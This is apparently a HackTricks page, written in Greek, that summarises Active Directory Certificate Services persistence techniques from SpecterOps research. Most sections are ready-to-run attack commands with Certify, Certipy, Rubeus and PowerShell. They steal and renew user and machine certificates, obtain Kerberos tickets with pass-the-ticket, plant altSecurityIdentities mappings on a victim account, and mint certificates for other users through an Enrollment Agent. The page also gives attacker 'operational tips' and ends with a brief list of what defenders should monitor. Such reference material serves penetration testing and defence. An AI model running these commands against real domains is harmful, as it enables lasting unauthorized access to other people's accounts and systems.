# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Αυτή είναι μια μικρή περίληψη των κεφαλαίων σχετικά με την επιμονή λογαριασμού από την καταπληκτική έρευνα του [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Κατανόηση της Κλοπής Διαπιστευτηρίων Ενεργού Χρήστη με Πιστοποιητικά – PERSIST1

Σε ένα σενάριο όπου ένα πιστοποιητικό που επιτρέπει την αυθεντικοποίηση τομέα μπορεί να ζητηθεί από έναν χρήστη, ένας επιτιθέμενος έχει την ευκαιρία να ζητήσει και να κλέψει αυτό το πιστοποιητικό για να διατηρήσει την επιμονή σε ένα δίκτυο. Από προεπιλογή, το πρότυπο `User` στο Active Directory επιτρέπει τέτοιες αιτήσεις, αν και μπορεί μερικές φορές να είναι απενεργοποιημένο.

Χρησιμοποιώντας [Certify](https://github.com/GhostPack/Certify) ή [Certipy](https://github.com/ly4k/Certipy), μπορείτε να αναζητήσετε ενεργά πρότυπα που επιτρέπουν την αυθεντικοποίηση πελάτη και στη συνέχεια να ζητήσετε ένα:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Η δύναμη ενός πιστοποιητικού έγκειται στην ικανότητά του να αυθεντικοποιεί ως ο χρήστης στον οποίο ανήκει, ανεξάρτητα από τις αλλαγές κωδικών πρόσβασης, εφόσον το πιστοποιητικό παραμένει έγκυρο.

Μπορείτε να μετατρέψετε το PEM σε PFX και να το χρησιμοποιήσετε για να αποκτήσετε ένα TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Σημείωση: Συνδυασμένο με άλλες τεχνικές (βλ. ενότητες ΚΛΟΠΗΣ), η πιστοποίηση βάσει πιστοποιητικών επιτρέπει μόνιμη πρόσβαση χωρίς να αγγίξει το LSASS και ακόμη και από μη ανυψωμένα περιβάλλοντα.

## Απόκτηση Μηχανικής Μόνιμης Πρόσβασης με Πιστοποιητικά - PERSIST2

Εάν ένας επιτιθέμενος έχει ανυψωμένα δικαιώματα σε έναν υπολογιστή, μπορεί να εγγραφεί ο λογαριασμός μηχανής του παραβιασμένου συστήματος για ένα πιστοποιητικό χρησιμοποιώντας το προεπιλεγμένο πρότυπο `Machine`. Η αυθεντικοποίηση ως η μηχανή επιτρέπει το S4U2Self για τοπικές υπηρεσίες και μπορεί να παρέχει ανθεκτική μόνιμη πρόσβαση στον υπολογιστή:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Extending Persistence Through Certificate Renewal - PERSIST3

Η κακή χρήση των περιόδων εγκυρότητας και ανανέωσης των προτύπων πιστοποιητικών επιτρέπει σε έναν επιτιθέμενο να διατηρεί μακροχρόνια πρόσβαση. Εάν κατέχετε ένα προηγουμένως εκδοθέν πιστοποιητικό και το ιδιωτικό του κλειδί, μπορείτε να το ανανεώσετε πριν από την λήξη του για να αποκτήσετε μια νέα, μακροχρόνια διαπιστευτήρια χωρίς να αφήσετε επιπλέον αποδεικτικά στοιχεία αιτήσεων που να σχετίζονται με τον αρχικό φορέα.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operational tip: Παρακολουθήστε τις διάρκειες των PFX αρχείων που κατέχει ο επιτιθέμενος και ανανεώστε νωρίς. Η ανανέωση μπορεί επίσης να προκαλέσει την ενημέρωση των πιστοποιητικών ώστε να περιλαμβάνουν την σύγχρονη επέκταση χαρτογράφησης SID, διατηρώντας τα χρήσιμα υπό αυστηρότερους κανόνες χαρτογράφησης DC (βλ. επόμενη ενότητα).

## Φύτευση Ρητών Χαρτογραφήσεων Πιστοποιητικών (altSecurityIdentities) – PERSIST4

Εάν μπορείτε να γράψετε στο χαρακτηριστικό `altSecurityIdentities` ενός στόχου λογαριασμού, μπορείτε να χαρτογραφήσετε ρητά ένα πιστοποιητικό που ελέγχεται από τον επιτιθέμενο σε αυτόν τον λογαριασμό. Αυτό παραμένει ενεργό κατά τις αλλαγές κωδικών πρόσβασης και, όταν χρησιμοποιούνται ισχυρές μορφές χαρτογράφησης, παραμένει λειτουργικό υπό την σύγχρονη επιβολή DC.

Υψηλού επιπέδου ροή:

1. Αποκτήστε ή εκδώστε ένα πιστοποιητικό αυθεντικοποίησης πελάτη που ελέγχετε (π.χ., εγγραφείτε στο πρότυπο `User` ως εσείς).
2. Εξαγάγετε έναν ισχυρό αναγνωριστικό από το πιστοποιητικό (Issuer+Serial, SKI ή SHA1-PublicKey).
3. Προσθέστε μια ρητή χαρτογράφηση στο `altSecurityIdentities` του θύματος χρησιμοποιώντας αυτόν τον αναγνωριστικό.
4. Αυθεντικοποιηθείτε με το πιστοποιητικό σας; το DC το χαρτογραφεί στο θύμα μέσω της ρητής χαρτογράφησης.

Παράδειγμα (PowerShell) χρησιμοποιώντας μια ισχυρή χαρτογράφηση Issuer+Serial:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Στη συνέχεια, αυθεντικοποιηθείτε με το PFX σας. Το Certipy θα αποκτήσει ένα TGT απευθείας:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
```
Σημειώσεις
- Χρησιμοποιήστε μόνο ισχυρούς τύπους αντιστοίχισης: X509IssuerSerialNumber, X509SKI ή X509SHA1PublicKey. Οι αδύναμοι μορφές (Subject/Issuer, Subject-only, RFC822 email) είναι παρωχημένες και μπορούν να αποκλειστούν από την πολιτική του DC.
- Η αλυσίδα πιστοποίησης πρέπει να καταλήγει σε μια ρίζα που εμπιστεύεται το DC. Οι Enterprise CAs στο NTAuth είναι συνήθως αξιόπιστες; ορισμένα περιβάλλοντα εμπιστεύονται επίσης δημόσιες CAs.

Για περισσότερα σχετικά με τις αδύναμες ρητές αντιστοιχίσεις και τις διαδρομές επίθεσης, δείτε:

{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent ως Επιμονή – PERSIST5

Εάν αποκτήσετε ένα έγκυρο πιστοποιητικό Certificate Request Agent/Enrollment Agent, μπορείτε να δημιουργήσετε νέα πιστοποιητικά ικανότητας σύνδεσης εκ μέρους των χρηστών κατά βούληση και να κρατήσετε το PFX του πράκτορα εκτός σύνδεσης ως σύμβολο επιμονής. Ροή κακοποίησης:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Η ανάκληση του πιστοποιητικού του πράκτορα ή των δικαιωμάτων του προτύπου είναι απαραίτητη για την απομάκρυνση αυτής της επιμονής.

## 2025 Ενίσχυση Χαρτογράφησης Ισχυρού Πιστοποιητικού: Επιπτώσεις στην Επιμονή

Η Microsoft KB5014754 εισήγαγε την Ενίσχυση Χαρτογράφησης Ισχυρού Πιστοποιητικού στους ελεγκτές τομέα. Από τις 11 Φεβρουαρίου 2025, οι DC προεπιλέγουν την Πλήρη Ενίσχυση, απορρίπτοντας αδύναμες/αμφίβολες χαρτογραφήσεις. Πρακτικές επιπτώσεις:

- Πιστοποιητικά πριν το 2022 που δεν διαθέτουν την επέκταση χαρτογράφησης SID ενδέχεται να αποτύχουν σε έμμεσες χαρτογραφήσεις όταν οι DC είναι σε Πλήρη Ενίσχυση. Οι επιτιθέμενοι μπορούν να διατηρήσουν την πρόσβαση είτε ανανεώνοντας τα πιστοποιητικά μέσω AD CS (για να αποκτήσουν την επέκταση SID) είτε φυτεύοντας μια ισχυρή ρητή χαρτογράφηση στο `altSecurityIdentities` (PERSIST4).
- Οι ρητές χαρτογραφήσεις που χρησιμοποιούν ισχυρές μορφές (Issuer+Serial, SKI, SHA1-PublicKey) συνεχίζουν να λειτουργούν. Οι αδύναμες μορφές (Issuer/Subject, Subject-only, RFC822) μπορούν να αποκλειστούν και θα πρέπει να αποφεύγονται για επιμονή.

Οι διαχειριστές θα πρέπει να παρακολουθούν και να ειδοποιούν για:
- Αλλαγές στο `altSecurityIdentities` και εκδόσεις/ανανεώσεις πιστοποιητικών Enrollment Agent και User.
- Καταγραφές έκδοσης CA για αιτήματα εκ μέρους και ασυνήθιστους κύκλους ανανέωσης.

## Αναφορές

- Microsoft. KB5014754: Αλλαγές στην πιστοποίηση βάσει πιστοποιητικού στους ελεγκτές τομέα Windows (χρονοδιάγραμμα επιβολής και ισχυρές χαρτογραφήσεις).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy Wiki – Αναφορά Εντολών (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference

{{#include ../../../banners/hacktricks-training.md}}
